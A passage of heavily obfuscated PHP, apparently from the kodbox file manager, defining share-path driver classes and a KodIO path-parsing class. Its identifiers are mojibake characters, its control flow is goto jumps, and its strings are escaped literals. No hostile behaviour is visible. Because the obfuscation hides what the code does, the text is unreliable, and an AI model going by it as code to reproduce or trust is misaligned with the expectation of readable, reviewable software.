$eÌîõ„“≈¨ = "\163\x6f\x75\x72\x63\x65") { goto eÖ·˜é†§; d‘À°Ÿìç´: return $this->add($fó‹ÓñºÖ†); goto CÂ≥Æ‡≠ÖÕ; E‚åïÚÚÚÓ: $dö·ı·Ó‘≥ = array($B®«ÀÆÉ— [1548] => USER_ID, $B®«ÀÆÉ— [477] => 0); $EØÚœ´»¶ = $this->where($dö·ı·Ó‘≥)->max($B®«ÀÆÉ— [1749]); if (!$EØÚœ´»¶) { $EØÚœ´»¶ = 0; } goto C…à±±†ñä; C…à±±†ñä: if (!$c°Éò‹ëËë && $eÌîõ„“≈¨ == $B®«ÀÆÉ— [411]) { $fÑÔ˜‡ï ¥ = Model($B®«ÀÆÉ— [1234])->where(array($B®«ÀÆÉ— [412] => $b∞ıãµõ«ø))->find(); if (!$fÑÔ˜‡ï ¥) { return !1; } $c°Éò‹ëËë = $fÑÔ˜‡ï ¥[$B®«ÀÆÉ— [28]]; } $c°Éò‹ëËë = $this->getAutoName($c°Éò‹ëËë); $fó‹ÓñºÖ† = array($B®«ÀÆÉ— [1548] => USER_ID, $B®«ÀÆÉ— [477] => 0, $B®«ÀÆÉ— [415] => $c°Éò‹ëËë, $B®«ÀÆÉ— [416] => $b∞ıãµõ«ø, $B®«ÀÆÉ— [417] => $eÌîõ„“≈¨, $B®«ÀÆÉ— [1730] => $EØÚœ´»¶ + 1); goto d‘À°Ÿìç´; eÖ·˜é†§: $B®«ÀÆÉ—  =& $_SERVER[’ÿƒ†ïò]; $dö·ı·Ó‘≥ = array($B®«ÀÆÉ— [1548] => USER_ID, $B®«ÀÆÉ— [477] => 0, $B®«ÀÆÉ— [417] => $eÌîõ„“≈¨, $B®«ÀÆÉ— [416] => $b∞ıãµõ«ø); if ($this->where($dö·ı·Ó‘≥)->find()) { return !1; } goto E‚åïÚÚÚÓ; CÂ≥Æ‡≠ÖÕ: } protected function remove($Eö„Òº⁄êÏ) { $BÆÚﬁÜÛ«å =& $_SERVER[’ÿƒ†ïò]; $cãç¶Çß∏ˆ = array($BÆÚﬁÜÛ«å[1548] => USER_ID, $BÆÚﬁÜÛ«å[414] => $Eö„Òº⁄êÏ); return $this->where($cãç¶Çß∏ˆ)->delete(); } protected function removeByName($F◊ë≈÷◊Ü£) { $F˘áÈå›¨∂ =& $_SERVER[’ÿƒ†ïò]; $f‡√–∫¨Ÿ› = array($F˘áÈå›¨∂[1548] => USER_ID, $F˘áÈå›¨∂[415] => $F◊ë≈÷◊Ü£, $F˘áÈå›¨∂[477] => 0); return $this->where($f‡√–∫¨Ÿ›)->delete(); } protected function rename($D¢çò¿êó“, $b•åÙ⁄ñﬁ‘) { $BúÆ–Ôõ»¿ =& $_SERVER[’ÿƒ†ïò]; if ($D¢çò¿êó“ == $b•åÙ⁄ñﬁ‘) { return !1; } $f±¿¡Ï„Ÿë = $this->getAutoName($b•åÙ⁄ñﬁ‘); if ($b•åÙ⁄ñﬁ‘ != $f±¿¡Ï„Ÿë) { return !1; } $dá ˜»ﬁ´¿ = array($BúÆ–Ôõ»¿[1548] => USER_ID, $BúÆ–Ôõ»¿[477] => 0, $BúÆ–Ôõ»¿[28] => $D¢çò¿êó“); return $this->where($dá ˜»ﬁ´¿)->save(array($BúÆ–Ôõ»¿[28] => $b•åÙ⁄ñﬁ‘)); } protected function resetSort($B—óµê§üá) { $aúÑﬁªÒ¨ì =& $_SERVER[’ÿƒ†ïò]; $B—óµê§üá = is_array($B—óµê§üá) ? $B—óµê§üá : array(); $fÖ—„úª±ò = array($aúÑﬁªÒ¨ì[1548] => USER_ID); for ($Eãüä⁄ûö• = 0; $Eãüä⁄ûö• < count($B—óµê§üá); $Eãüä⁄ûö•++) { $fÖ—„úª±ò[$aúÑﬁªÒ¨ì[414]] = $B—óµê§üá[$Eãüä⁄ûö•]; $this->where($fÖ—„úª±ò)->save(array($aúÑﬁªÒ¨ì[1730] => $Eãüä⁄ûö• + 1)); } return !0; } protected function moveTop($a¥π“çƒÌª) { goto d©Ωí≈˜ıÛ; cﬁ◊Î¿ö±: return $this->resetSort($BŒÿ‰áîÜ‘); goto Eà„È∞Àê†; d©Ωí≈˜ıÛ: $fÈ±œ”∏Õ‡ =& $_SERVER[’ÿƒ†ïò]; $FìµΩã≥ìø = array($fÈ±œ”∏Õ‡[1548] => USER_ID, $fÈ±œ”∏Õ‡[477] => 0); $eúºÀ„ùÈ• = $this->where($FìµΩã≥ìø)->where(array($fÈ±œ”∏Õ‡[28] => $a¥π“çƒÌª))->find(); goto BÈä¯≈«€ã; E‹Âπ™¡Ë¨: $AûÙ™’â¯ı = $BŒÿ‰áîÜ‘; $BŒÿ‰áîÜ‘ = array_remove_value($BŒÿ‰áîÜ‘, $eúºÀ„ùÈ•[$fÈ±œ”∏Õ‡[395]]); array_unshift($BŒÿ‰áîÜ‘, $eúºÀ„ùÈ•[$fÈ±œ”∏Õ‡[395]]); goto cﬁ◊Î¿ö±; BÈä¯≈«€ã: if (!$eúºÀ„ùÈ•) { return; } $BŒÿ‰áîÜ‘ = $this->field($fÈ±œ”∏Õ‡[395])->where($FìµΩã≥ìø)->order($fÈ±œ”∏Õ‡[2150])->select(); $BŒÿ‰áîÜ‘ = array_to_keyvalue($BŒÿ‰áîÜ‘, $fÈ±œ”∏Õ‡[33], $fÈ±œ”∏Õ‡[395]); goto E‹Âπ™¡Ë¨; Eà„È∞Àê†: } protected function moveBottom($e≥ˆ«±ˆÍ) { $bﬁˆ÷ìÍ™Â =& $_SERVER[’ÿƒ†ïò]; $aƒíÆÖ´éö = array($bﬁˆ÷ìÍ™Â[1548] => USER_ID, $bﬁˆ÷ìÍ™Â[477] => 0); $A≈Ô∏…˜“û = $this->where($aƒíÆÖ´éö)->max($bﬁˆ÷ìÍ™Â[1749]); $BÇøƒ≠Éíç = array($bﬁˆ÷ìÍ™Â[1749] => $A≈Ô∏…˜“û + 1); return $this->where($aƒíÆÖ´éö)->where(array($bﬁˆ÷ìÍ™Â[28] => $e≥ˆ«±ˆÍ))->save($BÇøƒ≠Éíç); } private function getAutoName($F§äπÉº©ù) { goto F“âÒÆﬂˆ; F¶ ÑªÑ»˘: $AßÚêÃàóπ = array_to_keyvalue($AßÚêÃàóπ, $f∫‘ÒÒÊÜå[33], $f∫‘ÒÒÊÜå[28]); if (!$AßÚêÃàóπ || !in_array($F§äπÉº©ù, $AßÚêÃàóπ)) { return $F§äπÉº©ù; } for ($DÕﬁÂñÇ•¡ = 0; $DÕﬁÂñÇ•¡ < count($AßÚêÃàóπ); $DÕﬁÂñÇ•¡++) { if (!in_array($F§äπÉº©ù . "\x28{$DÕﬁÂñÇ•¡}\x29", $AßÚêÃàóπ)) { return $F§äπÉº©ù . "\50{$DÕﬁÂñÇ•¡}\x29"; } } goto FÔˆπ∏ÆÊˆ; F“âÒÆﬂˆ: $f∫‘ÒÒÊÜå =& $_SERVER[’ÿƒ†ïò]; $EçˆıÖùôÚ = array($f∫‘ÒÒÊÜå[1548] => USER_ID, $f∫‘ÒÒÊÜå[477] => 0); $AßÚêÃàóπ = $this->field($f∫‘ÒÒÊÜå[28])->where($EçˆıÖùôÚ)->select(); goto F¶ ÑªÑ»˘; FÔˆπ∏ÆÊˆ: return $F§äπÉº©ù . "\x28{$DÕﬁÂñÇ•¡}\x29"; goto DîóäçòŸò; DîóäçòŸò: } } goto BèÊÔùƒáÆ; CˆøéﬁÂÜ: class PathDriverDbShareItem extends PathDriverDB { public function __construct($aáÍ†◊ô®¯) { $this->pathParse = $aáÍ†◊ô®¯; $this->model = Model($_SERVER[’ÿƒ†ïò][1234]); } public function getPathOuter($FæçåôÊπÃ) { $b»©ÇáøøÕ =& $_SERVER[’ÿƒ†ïò]; if (!$FæçåôÊπÃ) { return $FæçåôÊπÃ; } $fπ“‡—àŒı = $this->parse($FæçåôÊπÃ); return trim(KodIO::makeShare($this->pathParse[$b»©ÇáøøÕ[395]], $fπ“‡—àŒı[$b»©ÇáøøÕ[395]]), $b»©ÇáøøÕ[8]); } protected function infoParse($BæÿùΩøÍï, $Dÿ£Øå”· = false, $F≠åÚëŒéâ = false) { $EÖä§´‰äæ =& $_SERVER[’ÿƒ†ïò]; $EÆÁûƒåñ  = $this->pathParse[$EÖä§´‰äæ[395]]; $F“ç‚íåêÑ = trim($this->pathParse[$EÖä§´‰äæ[1092]], $EÖä§´‰äæ[8]); return Action($EÖä§´‰äæ[1242])->sharePathInfo($EÆÁûƒåñ , $F“ç‚íåêÑ); } public function infoFull($AÑ›≤ñàç) { $E÷áå∞ãìï =& $_SERVER[’ÿƒ†ïò]; $D…±§Ñáà∑ = explode($E÷áå∞ãìï[8], trim($AÑ›≤ñàç, $E÷áå∞ãìï[8])); if (count($D…±§Ñáà∑) > 1) { $A‹ ÓÀ£¥Ó = implode($E÷áå∞ãìï[8], array_splice($D…±§Ñáà∑, 1)); $cõò§÷éÔù = $this->model->pathInfoByPath($D…±§Ñáà∑[0], $A‹ ÓÀ£¥Ó); if (!$cõò§÷éÔù) { return !1; } $this->pathParse[$E÷áå∞ãìï[1092]] = $cõò§÷éÔù[$E÷áå∞ãìï[397]]; } return $this->infoParse($AÑ›≤ñàç); } public function listAll($CÈ¿»êËçò) { goto B®É≠Üﬁﬁå; c‰˜Û§êÉÀ: foreach ($F‘ªÑ∑åÿå as &$f¡æ˜ïœã¨) { check_abort(); $f¡æ˜ïœã¨[$b¿‚ƒàÓﬂ∂[85]] = $eñëõÔÇã ->_shareItemeParse($f¡æ˜ïœã¨[$b¿‚ƒàÓﬂ∂[85]], $d√—àç‰Íı); } unset($f¡æ˜ïœã¨); return $F‘ªÑ∑åÿå; goto AêÆÍ»√´î; dØäûØÏ»‘: $F‘ªÑ∑åÿå = $this->model->listAll($CÈ¿»êËçò); $d√—àç‰Íı = Model($b¿‚ƒàÓﬂ∂[589])->getInfo($e…øµ—†¢æ[$b¿‚ƒàÓﬂ∂[482]]); $eñëõÔÇã  = Action($b¿‚ƒàÓﬂ∂[1242]); goto c‰˜Û§êÉÀ; B®É≠Üﬁﬁå: $b¿‚ƒàÓﬂ∂ =& $_SERVER[’ÿƒ†ïò]; $e…øµ—†¢æ = IO::info($this->pathParse[$b¿‚ƒàÓﬂ∂[76]]); if (!$e…øµ—†¢æ) { return array(); } goto dØäûØÏ»‘; AêÆÍ»√´î: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($b”™‘ÙÚÙì) { $this->pathParse = $b”™‘ÙÚÙì; $this->model = Model($_SERVER[’ÿƒ†ïò][1234]); } protected function infoParse($Aßæ˜Í™â , $Eùß—â¥§ñ = false, $Dó©ÈÁúå£ = false) { $D⁄√“´áÎç =& $_SERVER[’ÿƒ†ïò]; return Action($D⁄√“´áÎç[1098])->sharePathInfo($this->pathParse[$D⁄√“´áÎç[76]], !0); } public function listPath($fπ˘©§–åó, $b¬ÙèÙ˘ÏÇ = false) { $AÃô—ﬂ»Â• =& $_SERVER[’ÿƒ†ïò]; $DÔìì µ„ó = parent::listPath($fπ˘©§–åó, $b¬ÙèÙ˘ÏÇ); foreach ($DÔìì µ„ó as $A‘ﬂ»ª√ıﬁ => $B⁄¥©âÙ’˜) { if (!in_array($A‘ﬂ»ª√ıﬁ, array($AÃô—ﬂ»Â•[74], $AÃô—ﬂ»Â•[75]))) { continue; } foreach ($B⁄¥©âÙ’˜ as $aÏ‰üÍµÃô => $a÷◊áÚæ∆€) { $DÔìì µ„ó[$A‘ﬂ»ª√ıﬁ][$aÏ‰üÍµÃô] = Action($AÃô—ﬂ»Â•[1098])->shareItemInfo($a÷◊áÚæ∆€); } } return $DÔìì µ„ó; } public function listAll($F≠ ¬Ô◊ŒÊ) { goto AãøÃ⁄ÂÍÿ; AãøÃ⁄ÂÍÿ: $B∞∑òà¯ø =& $_SERVER[’ÿƒ†ïò]; $A‡òπ¬Üâ∑ = IO::info($this->pathParse[$B∞∑òà¯ø[76]]); if (!$A‡òπ¬Üâ∑) { return array(); } goto d‚´Ñ‡Ôûì; a€¨ãÂ≤Üà: return $B“¨·Úâù÷; goto FÕéÕû£´å; d‚´Ñ‡Ôûì: $B“¨·Úâù÷ = $this->model->listAll($F≠ ¬Ô◊ŒÊ); foreach ($B“¨·Úâù÷ as &$eÌ—Ê ñâ‡) { $eÌ—Ê ñâ‡[$B∞∑òà¯ø[85]] = Action($B∞∑òà¯ø[1098])->shareItemInfo($eÌ—Ê ñâ‡[$B∞∑òà¯ø[85]]); } unset($eÌ—Ê ñâ‡); goto a€¨ãÂ≤Üà; FÕéÕû£´å: } } class PathDriverDriverShareItem { public function __construct($c◊àêŒåôÏ) { $this->pathParse = $c◊àêŒåôÏ; } public function __call($f‡èí∂û·ê, $bÃèà∆ÙÕ√) { $AŒÊÃßï´ƒ =& $_SERVER[’ÿƒ†ïò]; if (method_exists($this, $f‡èí∂û·ê)) { return; } $F∏ŒÃÃ—Ï≥ = call_user_func_array(array($AŒÊÃßï´ƒ[1243], $f‡èí∂û·ê), $bÃèà∆ÙÕ√); $f˜—ïª©°ä = array($AŒÊÃßï´ƒ[1244], $AŒÊÃßï´ƒ[1245], $AŒÊÃßï´ƒ[1246], $AŒÊÃßï´ƒ[1247], $AŒÊÃßï´ƒ[543], $AŒÊÃßï´ƒ[545], $AŒÊÃßï´ƒ[1248], $AŒÊÃßï´ƒ[107], $AŒÊÃßï´ƒ[1249], $AŒÊÃßï´ƒ[1250]); if (in_array($f‡èí∂û·ê, $f˜—ïª©°ä)) { $F∏ŒÃÃ—Ï≥ = $this->getPathOuter($F∏ŒÃÃ—Ï≥); } return $F∏ŒÃÃ—Ï≥; } public function copy($bàÑÑ‰Üê¨, $bÃó£¡Óûã, $C≠ú®›‹Áø = false) { return $this->copyMove($bàÑÑ‰Üê¨, $bÃó£¡Óûã, $C≠ú®›‹Áø, $_SERVER[’ÿƒ†ïò][543]); } public function move($d⁄∆ƒß¥¯ , $Fﬂ´œªÍÜ¡, $eÏåÃúÌÉâ = false) { return $this->copyMove($d⁄∆ƒß¥¯ , $Fﬂ´œªÍÜ¡, $eÏåÃúÌÉâ, $_SERVER[’ÿƒ†ïò][545]); } private function copyMove($cÉ¡ΩÌ§’•, $EÊ»Œ†Ö˜≥, $c›Ÿá—ˆüÁ, $fÚ∞÷Ì◊–÷) { goto f“¡ƒÔáë¬; f“¡ƒÔáë¬: $EÑ™ÿäÔ¡µ =& $_SERVER[’ÿƒ†ïò]; $D’‘¥©ÌÂÃ = $EÊ»Œ†Ö˜≥; $c‰Ã‹ßπ¿ª = IO::driverMake($EÊ»Œ†Ö˜≥); goto fÿŸúúá¥∑; f“‚˜¶πâı: return $AŸü™Ì¢Ü¯; goto fÂ¨ﬁËΩ´€; fÿŸúúá¥∑: if ($c‰Ã‹ßπ¿ª->pathParse[$EÑ™ÿäÔ¡µ[1076]]) { $EÊ»Œ†Ö˜≥ = $c‰Ã‹ßπ¿ª->pathParse[$EÑ™ÿäÔ¡µ[1076]]; } else { $EÊ»Œ†Ö˜≥ = $D’‘¥©ÌÂÃ; } $AŸü™Ì¢Ü¯ = IO::copyMove($cÉ¡ΩÌ§’•, $EÊ»Œ†Ö˜≥, $c›Ÿá—ˆüÁ, $fÚ∞÷Ì◊–÷); $AŸü™Ì¢Ü¯ = $this->getPathOuter($AŸü™Ì¢Ü¯); goto f“‚˜¶πâı; fÂ¨ﬁËΩ´€: } public function pathThis($DàÙ≤‰“áÙ) { return get_path_this($this->pathParse[$_SERVER[’ÿƒ†ïò][76]]); } public function pathFather($aìçÏÛ…èÃ) { return get_path_father($this->pathParse[$_SERVER[’ÿƒ†ïò][76]]); } public function iconvSystem($E∆º¬Ü¨“±) { return $E∆º¬Ü¨“±; } protected function infoParse($A•π“€‰ ù, $d≈Ô¯†∏Ï = false) { $DïèÌà¿éå =& $_SERVER[’ÿƒ†ïò]; $DËﬁ¶ç∑ì¨ = $this->pathParse[$DïèÌà¿éå[480]][$DïèÌà¿éå[1099]] . $this->pathParse[$DïèÌà¿éå[1092]]; if ($d≈Ô¯†∏Ï) { $f…É∏ÖΩÑÍ = IO::infoWithChildren($DËﬁ¶ç∑ì¨); } else { $f…É∏ÖΩÑÍ = IO::info($DËﬁ¶ç∑ì¨); } $b¡ï¡’ãâ÷ = $this->pathParse[$DïèÌà¿éå[480]]; return Action($DïèÌà¿éå[1242])->_shareItemeParse($f…É∏ÖΩÑÍ, $b¡ï¡’ãâ÷); } public function listAll($a«†∫⁄ø˘ú) { $BÈöÀ«¿≥ =& $_SERVER[’ÿƒ†ïò]; $a–‘Â‚å›Ñ = IO::listAll($a«†∫⁄ø˘ú); $c›çÈø“èæ = $this->pathParse[$BÈöÀ«¿≥[480]]; foreach ($a–‘Â‚å›Ñ as &$a∞í≥¢è Õ) { check_abort(); $a’÷ÙÂó›Ω = IO::info($a∞í≥¢è Õ[$BÈöÀ«¿≥[76]]); $a’÷ÙÂó›Ω = is_array($a’÷ÙÂó›Ω) ? $a’÷ÙÂó›Ω : array(); $a∞í≥¢è Õ = array_merge($a’÷ÙÂó›Ω, $a∞í≥¢è Õ); $a∞í≥¢è Õ[$BÈöÀ«¿≥[85]] = Action($BÈöÀ«¿≥[1242])->_shareItemeParse($a∞í≥¢è Õ, $c›çÈø“èæ); } unset($a∞í≥¢è Õ); return $a–‘Â‚å›Ñ; } public function getPathOuter($CåóîÑå—Ã) { goto c«Óóãèﬂç; f“ßãı≠«ì: if (substr($f≥ÑöòÙø¢, 0, strlen($F¡≠∂ºãÈæ)) != $F¡≠∂ºãÈæ) { return !1; } return $this->pathParse[$aº°êÖïë›[1093]] . $aº°êÖïë›[8] . ltrim($Fç∆Ò‹ÿáÇ, $aº°êÖïë›[8]); goto eÌŒ∑ﬁË¨à; aÇ©˘ÑØÌü: $f≥ÑöòÙø¢ = KodIO::clear($CåóîÑå—Ã); $F¡≠∂ºãÈæ = KodIO::clear($this->pathParse[$aº°êÖïë›[480]][$aº°êÖïë›[1099]]); $Fç∆Ò‹ÿáÇ = substr($f≥ÑöòÙø¢, strlen($F¡≠∂ºãÈæ)); goto f“ßãı≠«ì; c«Óóãèﬂç: $aº°êÖïë› =& $_SERVER[’ÿƒ†ïò]; $B°©•à·˘√ = KodIO::parse($CåóîÑå—Ã); if ($B°©•à·˘√[$aº°êÖïë›[29]] == KodIO::KOD_SHARE_ITEM) { return $B°©•à·˘√[$aº°êÖïë›[76]]; } goto aÇ©˘ÑØÌü; eÌŒ∑ﬁË¨à: } public function getType() { $DÑ·ÜõöòŸ =& $_SERVER[’ÿƒ†ïò]; $FîìÑì©Öâ = str_replace($DÑ·ÜõöòŸ[72], $DÑ·ÜõöòŸ[33], get_class($this)); return strtolower($FîìÑì©Öâ); } public function isTypeObject($b´Ÿà˘‡çë) { return IO::isTypeObject($b´Ÿà˘‡çë); } public function info($FîØ≠æöâ´) { return $this->infoParse($FîØ≠æöâ´); } public function infoAuth($f±ìßﬂ§¡ô) { return $this->infoParse($f±ìßﬂ§¡ô); } public function infoWithChildren($Eÿ¥ùé´•Á) { return $this->infoParse($Eÿ¥ùé´•Á, !0); } public function infoFull($e‹ƒ√Àœ¶ﬁ) { return $this->infoParse($e‹ƒ√Àœ¶ﬁ); } } goto A≠æÆÚ◊Âÿ; eåàù«‰È√: class KodIO { const KOD_SOURCE = "\173\x73\157\165\162\143\x65\175"; const KOD_USER_RECYCLE = "\x7b\x75\x73\145\x72\122\x65\x63\x79\x63\x6c\145\175"; const KOD_USER_FAV = "\173\x75\x73\x65\x72\106\141\166\175"; const KOD_USER_FILE_TAG = "\173\x75\x73\x65\x72\x46\151\x6c\x65\x54\141\x67\x7d"; const KOD_USER_FILE_TYPE = "\173\165\163\145\162\106\151\154\x65\124\171\160\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\162\157\x75\160\x52\x6f\x6f\x74\x53\145\x6c\x66\175"; const KOD_USER_SHARE = "\173\x75\x73\145\162\123\150\x61\162\145\175"; const KOD_USER_SHARE_LINK = "\173\x75\x73\145\x72\x53\150\141\x72\x65\x4c\x69\156\153\x7d"; const KOD_USER_SHARE_TO_ME = "\173\163\x68\141\162\145\x54\157\115\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\150\141\162\x65\111\164\145\x6d\175"; const KOD_SHARE_LINK = "\173\x73\x68\141\x72\x65\111\x74\x65\155\x4c\x69\156\x6b\175"; const KOD_SEARCH = "\173\163\x65\x61\x72\143\x68\175"; const KOD_BLOCK = "\173\x62\x6c\157\x63\153\x7d"; const KOD_IO = "\x7b\x69\x6f\x7d"; const KOD_USER_RECENT = "\173\x75\163\145\162\x52\145\x6e\x63\145\x6e\x74\x7d"; const KOD_USER_DRIVER = "\173\144\162\151\166\145\162\x7d"; public static function typeList() { $cÜ£‰™öˆ¿ =& $_SERVER[’ÿƒ†ïò]; return array($cÜ£‰™öˆ¿[1167] => self::KOD_SOURCE, $cÜ£‰™öˆ¿[1168] => self::KOD_USER_RECYCLE, $cÜ£‰™öˆ¿[1169] => self::KOD_USER_FAV, $cÜ£‰™öˆ¿[1170] => self::KOD_USER_FILE_TAG, $cÜ£‰™öˆ¿[1171] => self::KOD_USER_FILE_TYPE, $cÜ£‰™öˆ¿[1172] => self::KOD_GROUP_ROOT_SELF, $cÜ£‰™öˆ¿[1173] => self::KOD_USER_SHARE, $cÜ£‰™öˆ¿[1174] => self::KOD_USER_SHARE_LINK, $cÜ£‰™öˆ¿[1175] => self::KOD_USER_SHARE_TO_ME, $cÜ£‰™öˆ¿[1176] => self::KOD_SHARE_ITEM, $cÜ£‰™öˆ¿[1177] => self::KOD_SHARE_LINK, $cÜ£‰™öˆ¿[1178] => self::KOD_SEARCH, $cÜ£‰™öˆ¿[1179] => self::KOD_BLOCK, $cÜ£‰™öˆ¿[1180] => self::KOD_IO, $cÜ£‰™öˆ¿[1181] => self::KOD_USER_RECENT, $cÜ£‰™öˆ¿[1182] => self::KOD_USER_DRIVER); } public static function parse($E¯µöƒÒ∂ú) { goto eÏüµº¥Œ‡; eÏüµº¥Œ‡: $Fò±üèÁÚ¥ =& $_SERVER[’ÿƒ†ïò]; $E¯µöƒÒ∂ú = self::clear($E¯µöƒÒ∂ú); $DŸ±◊™…Ï» = array_values(self::typeList()); goto A•ùç‰∫∫Ñ; A•ùç‰∫∫Ñ: preg_match($Fò±üèÁÚ¥[1183], $E¯µöƒÒ∂ú, $cøòÏîÎ‚ú); $d“∂ºãÿËµ = array($Fò±üèÁÚ¥[417] => !1, $Fò±üèÁÚ¥[1184] => !1, $Fò±üèÁÚ¥[414] => !1, $Fò±üèÁÚ¥[76] => $E¯µöƒÒ∂ú, $Fò±üèÁÚ¥[1093] => !1, $Fò±üèÁÚ¥[1092] => $Fò±üèÁÚ¥[33]); if (is_array($cøòÏîÎ‚ú) && count($cøòÏîÎ‚ú) == 5) { $F¿Ï™⁄Ó≥Ë = $Fò±üèÁÚ¥[1185] . $cøòÏîÎ‚ú[2] . $Fò±üèÁÚ¥[325]; if (in_array($F¿Ï™⁄Ó≥Ë, $DŸ±◊™…Ï»)) { $d“∂ºãÿËµ[$Fò±üèÁÚ¥[1093]] = $cøòÏîÎ‚ú[1]; $d“∂ºãÿËµ[$Fò±üèÁÚ¥[29]] = $F¿Ï™⁄Ó≥Ë; $d“∂ºãÿËµ[$Fò±üèÁÚ¥[1186]] = substr($F¿Ï™⁄Ó≥Ë, 1, -1); $d“∂ºãÿËµ[$Fò±üèÁÚ¥[395]] = $cøòÏîÎ‚ú[3]; } $d“∂ºãÿËµ[$Fò±üèÁÚ¥[1092]] = $cøòÏîÎ‚ú[4]; } goto bçŒïœ†éª; bçŒïœ†éª: $D‰ì™¯÷øå = array($Fò±üèÁÚ¥[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $d“∂ºãÿËµ[$Fò±üèÁÚ¥[1148]] = in_array($d“∂ºãÿËµ[$Fò±üèÁÚ¥[29]], $D‰ì™¯÷øå); return $d“∂ºãÿËµ; goto e’ù†¶ïú¡; e’ù†¶ïú¡: } public static function isTruePath($EÍÌßŒ–ﬂ‘) { goto E¶ÿ°ƒÑÉ¯; fŒ«†¢å≥ï: if (strpos($EÍÌßŒ–ﬂ‘, $f ÷Çå†ÿó[1152]) === 0) { return !0; } if (strpos($EÍÌßŒ–ﬂ‘, $f ÷Çå†ÿó[1187]) === 0) { return !0; } if (strpos($EÍÌßŒ–ﬂ‘, $f ÷Çå†ÿó[1188]) === 0) { return !0; } goto c‚∫ÏÎﬂÈ∞; c‚∫ÏÎﬂÈ∞: if (strpos($EÍÌßŒ–ﬂ‘, $f ÷Çå†ÿó[1189]) === 0) { return !0; } return !1; goto CÛ©ëœ∞à≈; E¶ÿ°ƒÑÉ¯: $f ÷Çå†ÿó =& $_SERVER[’ÿƒ†ïò]; if (substr($EÍÌßŒ–ﬂ‘, 0, 1) != $f ÷Çå†ÿó[1185]) { return !0; } if (strpos($EÍÌßŒ–ﬂ‘, $f ÷Çå†ÿó[403]) === 0) { return !0; } goto fŒ«†¢å≥ï; CÛ©ëœ∞à≈: } public static function clear($a€Ùﬁã»Íü) { goto B’ÚÕ≠∂ãè; E´öì£ÛÖå: $C√¡‘†ÀË = $e¬Áàüæëã[1190]; if (substr($a€Ùﬁã»Íü, 0, 3) == $e¬Áàüæëã[1191]) { $a€Ùﬁã»Íü = substr($a€Ùﬁã»Íü, 3); } while (strstr($a€Ùﬁã»Íü, $C√¡‘†ÀË)) { $a€Ùﬁã»Íü = str_replace($C√¡‘†ÀË, $e¬Áàüæëã[8], $a€Ùﬁã»Íü); } goto açû∑–ü«≠; B’ÚÕ≠∂ãè: $e¬Áàüæëã =& $_SERVER[’ÿƒ†ïò]; $a€Ùﬁã»Íü = str_replace(array($e¬Áàüæëã[1066], $e¬Áàüæëã[229]), $e¬Áàüæëã[50], $a€Ùﬁã»Íü); $a€Ùﬁã»Íü = str_replace($e¬Áàüæëã[97], $e¬Áàüæëã[8], $a€Ùﬁã»Íü); goto E´öì£ÛÖå; açû∑–ü«≠: $a€Ùﬁã»Íü = preg_replace($e¬Áàüæëã[1192], $e¬Áàüæëã[8], $a€Ùﬁã»Íü); if ($a€Ùﬁã»Íü == $e¬Áàüæëã[8]) { return $e¬Áàüæëã[8]; } $a€Ùﬁã»Íü = rtrim($a€Ùﬁã»Íü, $e¬Áàüæëã[8]); goto C‡¡Êé∞≥Ω; C‡¡Êé∞≥Ω: return $a€Ùﬁã»Íü; goto fÊ”·›ÑŒ ; fÊ”·›ÑŒ : } public static function sourceID($B÷·¥∞î‘˜) { $AêπÉÇ⁄‘ê =& $_SERVER[’ÿƒ†ïò]; $C∫ÿ¥›ı¬ë = self::parse($B÷·¥∞î‘˜); if ($C∫ÿ¥›ı¬ë[$AêπÉÇ⁄‘ê[29]] !== self::KOD_SOURCE) { show_json(LNG($AêπÉÇ⁄‘ê[1193]), !1); } return $C∫ÿ¥›ı¬ë[$AêπÉÇ⁄‘ê[395]]; } public static function make($còÌÃÇ¿ß˜) { if (!$còÌÃÇ¿ß˜) { return !1; } return self::makePath(self::KOD_SOURCE, intval($còÌÃÇ¿ß˜)); } public static function makeShare($B◊õòπÉ¬æ, $b÷±•ÃÁ÷‹) { return self::makePath(self::KOD_SHARE_ITEM, $B◊õòπÉ¬æ, $b÷±•ÃÁ÷‹); } public static function makeFileTypePath($BúÈê≤‘†œ) { return self::makePath(self::KOD_USER_FILE_TYPE, $BúÈê≤‘†œ); } public static function makeFileTagPath($cıâúË≠†Ù) { return self::makePath(self::KOD_USER_FILE_TAG, $cıâúË≠†Ù); } public static function makePath($dÕàÛ˘îÑÁ, $føáëè£éÀ = '', $b•≥§‘‡ˆç = '') { $f⁄Ü»‹ÑÙÿ =& $_SERVER[’ÿƒ†ïò]; $bﬂÒÇæ‘à© = substr($dÕàÛ˘îÑÁ, 1, -1); $Cê…«§≥¶≠ = $f⁄Ü»‹ÑÙÿ[1194] . $bﬂÒÇæ‘à© . $f⁄Ü»‹ÑÙÿ[1195] . $føáëè£éÀ . $f⁄Ü»‹ÑÙÿ[1196]; $Cê…«§≥¶≠ = $b•≥§‘‡ˆç ? $Cê…«§≥¶≠ . $b•≥§‘‡ˆç . $f⁄Ü»‹ÑÙÿ[8] : $Cê…«§≥¶≠; return $Cê…«§≥¶≠; } public static function hashPath($f…Œ¡ÌıŸØ, $DÈÕ∫ö≥Úä = true) { goto aΩé≠œ¢Ù†; bçÛ≠ÖÊÌÖ: if (!$eæ€åœ§ì™ && isset($E∫·œÜ£çÚ[$AÆ™ëàÏòá[397]])) { $E∫·œÜ£çÚ = IO::info(KodIO::make($E∫·œÜ£çÚ[$AÆ™ëàÏòá[397]])); $eæ€åœ§ì™ = _get($E∫·œÜ£çÚ, $AÆ™ëàÏòá[1197], $AÆ™ëàÏòá[33]); } if (!$eæ€åœ§ì™ && $DÈÕ∫ö≥Úä) { $a« áàã≥Í = KodIO::parse($E∫·œÜ£çÚ[$AÆ™ëàÏòá[76]]); if (!$a« áàã≥Í[$AÆ™ëàÏòá[29]]) { $eæ€åœ§ì™ = IO::hashSimple($E∫·œÜ£çÚ[$AÆ™ëàÏòá[76]]); } } if (!$eæ€åœ§ì™) { $eæ€åœ§ì™ = md5($E∫·œÜ£çÚ[$AÆ™ëàÏòá[76]] . $E∫·œÜ£çÚ[$AÆ™ëàÏòá[78]] . $E∫·œÜ£çÚ[$AÆ™ëàÏòá[84]]); } goto f†ÕîÉæë©; aΩé≠œ¢Ù†: $AÆ™ëàÏòá =& $_SERVER[’ÿƒ†ïò]; $E∫·œÜ£çÚ = is_array($f…Œ¡ÌıŸØ) ? $f…Œ¡ÌıŸØ : 